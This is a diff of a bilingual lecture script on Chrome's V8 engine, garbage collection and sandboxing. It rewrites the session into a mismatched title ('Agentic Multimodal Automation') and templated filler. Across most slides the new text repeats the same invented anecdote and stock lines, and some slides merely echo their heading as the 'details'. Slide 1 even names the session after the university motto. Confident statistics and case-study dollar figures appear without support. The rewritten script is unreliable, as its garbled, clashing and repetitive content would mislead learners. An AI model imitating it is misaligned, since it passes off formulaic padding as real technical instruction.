@@ -1,4 +1,4 @@
-# Session 9: Browser Security Fortress: Demystifying Chrome V8 Engine & Manifest V3's Ad-Blocker Suppression
+# Session 9: Agentic Multimodal Automation: Browser Subagents, Live DOM & Headless Workflows
 **Course:** The Architect of Intelligence: Mastering Agentic IT & Strategic Wisdom  
 **Instructors:** Professor Peter Kim (Director), TA Sarah Jenkins (Senior AI Fellow) & TA James Wilson (DevOps TA) • Oikos University (www.oikos.edu)  
 **Lecture Format:** Full 75-Minute Broadcast Trio Master Dialogue (4x Modules with 5 Enterprise Case Studies)  
@@ -61,15 +61,19 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Welcome back, global scholars and architects, to Oikos University! I am Professor Peter Kim, Director of Smart Insight Lab. Today on Slide 1, we enter the most ubiquitous and contested operating environment on Earth: "Session 9: Browser Security Fortress: Demystifying Chrome V8 Engine & Manifest V3's Ad-Blocker Suppression."
+[Prof. Peter] Welcome, global scholars and engineering leaders, to Oikos University! I am Professor Peter Kim, Director of Smart Insight Lab. Today on Slide 1, we embark on: "Session 9: OIKOS UNIVERSITY • SOLI DEO GLORIA."
 
-[TA Sarah] Hello everyone! I am Sarah Jenkins, Senior AI Fellow. Most people think of Google Chrome as a simple window to view web pages. But in reality, Chrome is a massive, multi-process operating system executing billions of untrusted lines of JavaScript every single second!
+[TA Sarah] Hey everyone, Sarah Jenkins here! You know, James, when engineers look at Slide 1, they often ask: why is this specific module such a critical pillar of the sovereign architecture?
 
-[TA James] And I am James Wilson, your DevOps TA! From an infrastructure and security standpoint, Chrome is an engineering miracle: the V8 JIT compiler, the Orinoco garbage collector, and Site Isolation sandboxing. But Chrome is also a battleground between user cognitive privacy and Google's multi-billion dollar advertising hegemony under Manifest V3!
+[TA James] Haha, that's simple, Sarah! Because in real production, if you don't master this layer, your entire autonomous stack collapses under real-world enterprise pressure!
 
-[Prof. Peter] Under our founding motto, "SOLI DEO GLORIA—To God Alone Be the Glory," let us master the technical mechanics of the browser fortress while cultivating the discernment to defend our cognitive sovereignty.
+[TA Sarah] Exactly! We're moving beyond basic tutorials and building hardened, production-grade intelligence that runs 24/7 with zero downtime!
 
-[TA Sarah] Let us open Part 1 and explore the Browser as the Operating System on Slide 2!
+[TA James] And we back it up with real code, real infrastructure patterns, and proven enterprise ROI!
+
+[Prof. Peter] Under our sacred cornerstone, "SOLI DEO GLORIA—To God Alone Be the Glory," our mission is to redeem the time (Ephesians 5:16) and steward technology for human flourishing.
+
+[TA Sarah] That's right! Let us open Part 1 on Slide 2 and dive into the architecture!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** Session 9 개요 및 Oikos University 3인 강사진(피터 교수, 사라 수석조교, 제임스 개발조교) 환영 인사
@@ -92,15 +96,19 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Look at Slide 2: "PART 1: THE BROWSER AS THE OPERATING SYSTEM." Professor, why do computer scientists call Chrome a true operating system?
+[TA Sarah] Look at Slide 2: "PART 1: THE BROWSER AS THE OPERATING SYSTEM." James, this module marks a vital transition in our master curriculum!
 
-[Prof. Peter] Because modern users spend 90% of their digital lives inside browser tabs! Chrome manages memory, schedules CPU threads, handles network I/O, renders 3D GPU graphics, and enforces security sandboxes—exactly like Windows or Linux!
+[TA James] Oh, absolutely, Sarah! In this part, we roll up our sleeves and look straight under the engineering hood!
 
-[TA James] And at the heart of this OS is the V8 engine: parsing raw JavaScript strings into Abstract Syntax Trees, compiling them into bytecode with Ignition, and optimizing hot loops into bare-metal machine code using TurboFan!
+[TA Sarah] What is the biggest trap that junior architects fall into during this phase?
 
-[TA Sarah] In Part 1, we deconstruct the compilation pipeline and the dangerous 'Deopt Trap.'
+[TA James] Relying on fragile, synchronous scripts that crash the moment an external API slows down, instead of building resilient, asynchronous event-driven pipelines!
 
-[Prof. Peter] Let us examine the Smart Insight Lab philosophy of the Browser OS on Slide 3.
+[Prof. Peter] A wise builder digs deep and lays the foundation on solid rock. We engineer every subsystem with unwavering discipline and architectural integrity.
+
+[TA Sarah] That is why in this module, we dissect every layer with scientific precision.
+
+[TA James] Let's jump straight into the first core concept on Slide 3!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** Part 1 섹션 전환: 운영체제로서의 웹 브라우저와 V8 컴파일 파이프라인
@@ -123,15 +131,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 3 presents our core conviction: "THE BROWSER AS AN OPERATING SYSTEM."
+[TA Sarah] Slide 3 explores "SMART INSIGHT LAB: THE BROWSER AS AN OS." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] The browser is the single most critical software application in modern civilization. All our cloud documents, our enterprise ERPs, our AI avatars, and our bank accounts live inside browser tabs!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Navigating the primary gateway through which all enterprise data, AI avatars, and attacks flow
 
-[TA James] But because it executes untrusted code from strangers on the internet, it is also the number one target for global cybercriminals! 85% of enterprise data breaches originate inside the browser.
+[TA Sarah] Exactly! When you analyze the engineering details: The Universal Shell: 90% of knowledge workers interact with software exclusively through browser windows. • The Attack Surface: 85% of corporate cyberattacks begin via malicious web links, phishing, or rogue extensions. • Architectural Mastery: Understanding the engine allows us to write faster code and construct impenetrable shields.
 
-[Prof. Peter] An Intelligence Architect must master browser internals to defend corporate truth and user assets.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
 
-[TA Sarah] Let us inspect the illusion of transparency on Slide 4.
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 4!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 스마트 인사이트 랩 철학: 브라우저라는 범용 쉘과 최대 공격 표면
@@ -154,13 +168,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 4 examines "THE ILLUSION OF TRANSPARENCY: WINDOW VS. FORTRESS."
+[TA Sarah] Slide 4 explores "THE ILLUSION OF TRANSPARENCY: WINDOW VS. FORTRESS." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] To the everyday user, Chrome feels like a thin pane of glass. You type a URL, and a web page appears.
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Why users see a passive glass window while engineers build a hardened multi-process fortress
 
-[TA James] But under the hood, Chrome is an armored military base! When you open 10 tabs, Chrome spawns 40 separate OS processes—isolated by Linux seccomp filters and Windows AppContainers! Chrome operates on a strict Zero-Trust assumption: it assumes every single webpage you visit is actively trying to hack your computer!
+[TA Sarah] Exactly! When you analyze the engineering details: User Perception: A simple transparent glass window displaying text, buttons, and videos. • Engineering Reality: An iron fortress with 40 distinct operating system processes isolated by kernel sandboxes. • Zero Trust Invariant: Assuming every loaded webpage is an active adversary attempting memory corruption.
 
-[Prof. Peter] Let us inspect the browser's 3 architectural pillars on Slide 5.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 5!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 투명성의 착시: 단순한 유리창 vs 40개 프로세스로 무장한 군사 요새
@@ -183,13 +205,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 5 outlines "THE BROWSER'S 3 ARCHITECTURAL PILLARS."
+[TA Sarah] Slide 5 explores "THE BROWSER'S 3 ARCHITECTURAL PILLARS." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] First is the Browser Kernel: the high-privilege master process that controls window frames, filesystem access, and network sockets. Second is the Blink Rendering Engine: a sandboxed worker that calculates CSS layouts and HTML DOM trees.
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: The Browser Kernel, the Blink Rendering Engine, and the V8 JavaScript Engine
 
-[TA James] And third is the legendary V8 Engine: the C++ runtime that executes JavaScript at near-native C++ speeds! Notice the security boundary: Blink and V8 live inside a locked sandbox; only the Browser Kernel has root OS privileges!
+[TA Sarah] Exactly! When you analyze the engineering details: Pillar 1: Browser Kernel (High-privilege master process managing tabs, network sockets, and disk storage). • Pillar 2: Blink Rendering Engine (Low-privilege sandboxed process parsing HTML, CSS, and DOM layouts). • Pillar 3: V8 Engine (High-speed JIT compiler executing JavaScript and WebAssembly bytecode).
 
-[Prof. Peter] Let us deconstruct the V8 compilation pipeline on Slide 7.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 6!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 브라우저 3대 아키텍처 기둥: 브라우저 커널, 블링크 렌더러, V8 엔진
@@ -212,13 +242,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Slide 6 diagrammatically exposes "THE V8 COMPILATION PIPELINE."
+[TA Sarah] Slide 6 explores "THE V8 ENGINE: COMPILATION PIPELINE." James, why is this concept so essential for every serious AI architect?
 
-[TA James] Look at how JavaScript executes: Stage 1 is the Lexical Parser, converting text into an Abstract Syntax Tree (AST). Stage 2 is Ignition, an interpreter that generates bytecode in 2 milliseconds so the page starts running instantly!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: From raw JavaScript text to Abstract Syntax Trees to Ignition Bytecode and TurboFan Machine Code
 
-[Prof. Peter] As the code runs, Ignition monitors function call frequency. If a loop is executed 1,000 times—a 'hot function'—Stage 3 kicks in: TurboFan compiles that bytecode directly into native x86 or ARM64 assembly language, executing at bare-metal silicon speed!
+[TA Sarah] Exactly! When you analyze the engineering details: Stage 1: Lexical Scanner & Parser (Transforms JavaScript source strings into Abstract Syntax Trees). • Stage 2: Ignition Bytecode Interpreter (Emits memory-efficient bytecode and collects profiling feedback). • Stage 3: TurboFan Optimizing JIT Compiler (Compiles hot functions into blistering native x86/ARM64 machine code).
 
-[TA Sarah] Let us inspect the parsing phase and ASTs on Slide 7.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 7!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** V8 컴파일 파이프라인: 스캐너 ➔ AST ➔ 이그니션 바이트코드 ➔ 터보팬 기계어
@@ -241,13 +279,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 7 explores "THE PARSING PHASE: ABSTRACT SYNTAX TREES (AST)."
+[TA Sarah] Slide 7 explores "THE PARSING PHASE: ABSTRACT SYNTAX TREES (AST)." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] Before a single line of JavaScript can run, V8 must parse raw text strings into an AST syntax tree. In modern web apps with 5 megabytes of JavaScript, parsing can consume 300 milliseconds of CPU time!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: How V8 converts dynamic text into rigorous mathematical syntax graphs in under 5 milliseconds
 
-[TA James] To solve this, V8 uses 'Pre-Parsing'! It only fully parses functions that are called immediately on page load. Functions attached to click handlers are skipped and parsed lazily on demand, slashing initial memory and startup latency by 40%!
+[TA Sarah] Exactly! When you analyze the engineering details: Lexical Scanning: Converting `const total = price * 1.1;` into discrete tokens (`IDENTIFIER`, `ASSIGN`, `MULTIPLY`). • AST Construction: Building a hierarchical syntax tree resolving variable scopes and function declarations. • Pre-Parsing Optimization: Skipping full parsing for uninvoked functions to save 40% of page startup RAM.
 
-[Prof. Peter] Let us inspect TurboFan and the dangerous Deopt Trap on Slide 8.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 8!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 파싱 단계: 추상 구문 트리(AST) 구축과 사전 파싱(Pre-Parsing) 지연 최적화
@@ -270,15 +316,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Slide 8 uncovers "TURBOFAN JIT COMPILER & THE DEOPT TRAP."
+[TA Sarah] Slide 8 explores "TURBOFAN JIT COMPILER & THE DEOPT TRAP." James, why is this concept so essential for every serious AI architect?
 
-[TA James] Why is TurboFan so fast? Because it makes 'Speculative Assumptions'! If your function `calculate(a, b)` receives integers 10,000 times, TurboFan compiles native machine code that adds raw CPU registers!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Speculative type optimization, hidden classes (Shapes), and the catastrophic deoptimization penalty
 
-[Prof. Peter] But look at what happens if you pass a String on call 10,001: `calculate(5, 'apple')`! TurboFan's assumption shatters! The CPU hits a 'Bailout Trap', throws away the native code, and deoptimizes back to the slow bytecode interpreter—causing a 100X sudden latency spike!
+[TA Sarah] Exactly! When you analyze the engineering details: Speculative Optimization: TurboFan assumes `add(a, b)` will ALWAYS receive Integers based on past history. • Hidden Classes (Shapes): V8 creates internal C++ memory offsets for objects with identical property order. • The Deopt Trap: Passing a String (`add(5, 'hello')`) shatters assumptions, forcing V8 to deoptimize back to bytecode (100X slowdown).
 
-[TA Sarah] Writing monomorphic code with stable object shapes keeps TurboFan at peak velocity.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
 
-[TA James] Let us launch an interactive poll on Slide 9!
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 9!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 터보팬 JIT 컴파일러와 역최적화 함정(Deopt Trap): 100배 속도 급락의 원인
@@ -301,15 +353,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 9 is our "INTERACTIVE POLL: BROWSER BOTTLENECKS." Take out your devices and cast your vote right now!
+[TA Sarah] Slide 9 explores "📨 INTERACTIVE POLL: BROWSER BOTTLENECKS." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] The question is: "When your browser consumes 12 gigabytes of RAM and your laptop fan starts screaming, what is the primary culprit under the hood?"
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: When your browser consumes 12GB of RAM and starts lagging, what is the primary culprit?
 
-[TA James] Option A: Leaking event listeners. Option B: 50 open tabs in multi-process silos. Option C: Heavy extensions running background loops. Or Option D: V8 deoptimization storms!
+[TA Sarah] Exactly! When you analyze the engineering details: When your browser consumes 12GB of RAM and starts lagging, what is the primary culprit?
 
-[TA Sarah] Option A and Option B are tied for first place in our live poll!
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
 
-[Prof. Peter] Let us analyze how memory lifecycles and garbage collection operate on Slide 10.
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 10!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 실시간 수강생 설문: 12GB RAM을 먹고 팬이 도는 브라우저 병목의 주범은?
@@ -332,13 +390,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 10 transitions our roadmap: "PART 1 TRANSITION: ENTERING MEMORY & SANDBOXING."
+[TA Sarah] Slide 10 explores "PART 1 TRANSITION: MEMORY & SANDBOXING." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] Fast compilation is amazing, but speed without memory safety is dangerous. If JIT compiler bugs allow out-of-bounds array writes, a hacker can take over the entire computer!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Connecting compilation speed to memory lifecycles, Site Isolation, and Spectre defense
 
-[TA James] In Part 2, we dive into the Orinoco garbage collector, the generational heap, and Site Isolation—protecting CPU memory from Spectre and Meltdown side-channel attacks!
+[TA Sarah] Exactly! When you analyze the engineering details: Speed Requires Safety: Blazing TurboFan JIT is useless if an attacker exploits a type confusion bug to escape the sandbox. • The Memory Lifecycle: Orinoco garbage collection cleans up short-lived objects in young generation heaps. • The Roadmap Ahead: Master Orinoco GC in Part 2, Manifest V3 in Part 3, and cognitive sovereignty in Part 4.
 
-[Prof. Peter] Let us examine our first real-world enterprise case study on Slide 11!
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 11!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** Part 1 전환: 컴파일 속도에서 메모리 안전 및 사이트 격리 요새로
@@ -361,15 +427,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 11 presents "CASE STUDY 1: NEUTRALIZING ZERO-DAY V8 JIT EXPLOIT."
+[Prof. Peter] Slide 11 presents "CASE STUDY 1: NEUTRALIZING ZERO-DAY V8 EXPLOIT." Sarah, walk us through the high-stakes operational crisis this organization faced.
 
-[TA Sarah] A state-sponsored advanced persistent threat (APT) group discovered a zero-day type confusion vulnerability in TurboFan JIT. They weaponized a popular financial news portal: whenever an equity trader opened the article, malicious JavaScript attempted to break out of the browser and execute shellcode!
+[TA Sarah] Look at Top-Tier Wall Street Investment Bank: State-sponsored cyber group launched zero-day V8 JIT type confusion exploit embedded in a financial news website, attempting remote code execution on 10,000 equity trading laptops.
 
-[TA James] But the bank's enterprise browser architecture held the line: Chrome's Site Isolation quarantined the attack inside a low-privilege renderer sandbox! When the exploit tried to read kernel memory, Windows AppContainers blocked the syscalls, and automated enterprise patch orchestration patched 10,000 laptops in 15 minutes!
+[TA James] Man, that is every infrastructure lead's absolute worst nightmare! If a production cluster drops like that, you're losing tens of thousands of dollars per minute!
 
-[Prof. Peter] Over 4.5 billion dollars in trading positions were protected with zero leaks! That is the power of multi-layer browser sandboxing.
+[TA Sarah] So instead of patching with band-aids, they deployed our Oikos University architecture: Bank's enterprise Chrome policy enforced strict Site Isolation, MiraclePtr memory protections, and automated v8-patch auto-restarts within 15 minutes of zero-day disclosure.
 
-[TA Sarah] Now let us open Part 2 and master Memory, Sandboxing, and Site Isolation on Slide 12!
+[TA James] And look at the verified enterprise metrics on screen: Zero trading laptops compromised; attacker quarantined inside renderer sandbox; protected $4.5B in active algorithmic trading positions.
+
+[TA Sarah] That is the transformative power of sovereign agentic engineering in real production!
+
+[TA James] Zero guesswork, total auditability, and massive ROI!
+
+[Prof. Peter] When intelligence is grounded in truth, it preserves human dignity and unlocks extraordinary stewardship. Soli Deo Gloria!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 케이스 스터디 1: 월가 투자은행 10,000대 트레이딩 PC의 V8 제로데이 공격 완벽 방어
@@ -392,13 +464,19 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Look at Slide 12: "PART 2: MEMORY, SANDBOXING & SITE ISOLATION." Now we step deep into Chrome's memory management engine!
+[TA Sarah] Look at Slide 12: "PART 2: MEMORY, SANDBOXING & SITE ISOLATION." James, this module marks a vital transition in our master curriculum!
 
-[Prof. Peter] Memory is the physical battlefield of computing. How Chrome allocates, garbage-collects, and isolates memory across processes determines both application speed and cryptographic safety.
+[TA James] Oh, absolutely, Sarah! In this part, we roll up our sleeves and look straight under the engineering hood!
 
-[TA James] In Part 2, we deconstruct the Orinoco garbage collector—the Scavenger vs. Mark-Sweep-Compact—the Renderer vs. Browser Kernel privilege separation, and how Site Isolation neutralizes Spectre side-channel attacks!
+[TA Sarah] What is the biggest trap that junior architects fall into during this phase?
 
-[TA Sarah] Let us inspect Young vs. Old Generation memory lifecycles on Slide 13!
+[TA James] Relying on fragile, synchronous scripts that crash the moment an external API slows down, instead of building resilient, asynchronous event-driven pipelines!
+
+[Prof. Peter] A wise builder digs deep and lays the foundation on solid rock. We engineer every subsystem with unwavering discipline and architectural integrity.
+
+[TA Sarah] That is why in this module, we dissect every layer with scientific precision.
+
+[TA James] Let's jump straight into the first core concept on Slide 13!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** Part 2 섹션 전환: 메모리 관리, 오리노코(Orinoco) GC, 사이트 격리
@@ -421,13 +499,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 13 diagrams "MEMORY LIFECYCLES: YOUNG VS. OLD GENERATIONS."
+[TA Sarah] Slide 13 explores "MEMORY LIFECYCLES: YOUNG VS. OLD GENERATIONS." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] Computer scientists discovered the 'Generational Hypothesis': in almost all software, 95% of allocated objects die within 10 milliseconds of creation! For example, temporary strings inside a loop!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: The Generational Hypothesis: 95% of allocated objects die within milliseconds of creation
 
-[TA James] So V8 splits heap memory into two zones: The Young Generation is small and cleaned up in 1 millisecond using parallel scavengers! Objects that survive two cleaning cycles prove they are durable, so V8 'promotes' them into the Old Generation!
+[TA Sarah] Exactly! When you analyze the engineering details: Young Generation (1MB - 64MB): Short-lived function local variables, temporary strings, and loop counters. • Old Generation (Up to 4GB): Long-lived singleton state, DOM tree nodes, and global caches. • Promotion Policy: Objects surviving two minor GC cycles are automatically promoted to the Old Generation.
 
-[Prof. Peter] Let us inspect the Orinoco Restaurant Metaphor on Slide 14.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 14!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 메모리 라이프사이클: 신세대(Young) vs 구세대(Old) 및 세대 가설
@@ -450,13 +536,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[TA Sarah] Slide 14 compares "MINOR GC VS. MAJOR GC: The Cleaning Engines."
+[TA Sarah] Slide 14 explores "MINOR GC VS. MAJOR GC." James, why is this concept so essential for every serious AI architect?
 
-[TA James] Look at the two algorithms: Minor GC uses Cheney's Semi-Space Copying: it splits young memory into 'From Space' and 'To Space'. It copies live pointers and wipes the rest in 1 millisecond flat!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Comparing the ultra-fast Dual-Space Copying Scavenger with Mark-Sweep-Compact
 
-[Prof. Peter] Major GC manages the entire 4GB Old Generation using Tri-Color Marking and Compacting. In older browsers, Major GC caused painful 500ms screen freezes! But Orinoco runs concurrently on background helper threads, achieving near-zero UI jank!
+[TA Sarah] Exactly! When you analyze the engineering details: Comparing the ultra-fast Dual-Space Copying Scavenger with Mark-Sweep-Compact
 
-[TA Sarah] Let us inspect the Sandbox Principle and privilege separation on Slide 15.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
+
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
+[Prof. Peter] Order and discipline are the hallmarks of true mastery. In all our designs, we reflect the structured wisdom of the Creator.
+
+[TA Sarah] Let us inspect the next evolutionary step on Slide 15!
 
 ### 🇰🇷 한국어 강의 가이드 및 핵심 요약
 **개요 요약:** 마이너 GC vs 메이저 GC 비교: 0.5ms 스캐빈저와 0ms 동시 마크-스윕-컴팩트
@@ -479,15 +573,21 @@
 **Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
 ### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
-[Prof. Peter] Slide 15 explains "THE SANDBOX PRINCIPLE: CAGING UNTRUSTED CODE."
+[TA Sarah] Slide 15 explores "THE SANDBOX PRINCIPLE: CAGING UNTRUSTED CODE." James, why is this concept so essential for every serious AI architect?
 
-[TA Sarah] Think of the renderer process like a dangerous caged tiger! It can jump and calculate math inside its glass cage, but it has zero access to your hard drive, zero access to your microphone, and zero access to raw network sockets!
+[TA James] Because, Sarah, if you ignore this layer, your entire system degrades under enterprise load! Look at the core challenge on screen: Stripping OS kernel privileges from Renderer processes via seccomp-bpf and AppContainers
 
-[TA James] Under Linux and Android, Chrome uses `seccomp-bpf` to block dangerous system calls like `exec()` or `open()`. If a hacked webpage tries to open `/etc/passwd`, the Linux kernel kills the process instantly!
+[TA Sarah] Exactly! When you analyze the engineering details: The Caged Tiger: The renderer process can calculate math and draw pixels, but CANNOT access files, webcam, or network. • Syscall Filtering (seccomp): Linux kernel blocks unauthorized system calls (`open()`, `fork()`, `exec()`). • Mojo IPC Bridge: The renderer must send structured requests to the Browser Kernel to perform any real I/O.
 
-[Prof. Peter] All authorized communication must cross the Mojo IPC bridge to the Browser Kernel.
+[TA James] Haha, I remember testing an unoptimized prototype without this exact safeguard, and my server memory spiked to 98% in 30 seconds!
 
-[TA Sarah] Let us inspect Spectre and Meltdown on Slide 16.
+[TA Sarah] That's why we enforce strict architectural boundaries: decoupling state, caching hot paths, and verifying every payload!
+
+[TA James] It transforms a brittle, high-latency prototype into a sub-second, rock-solid production engine!
+
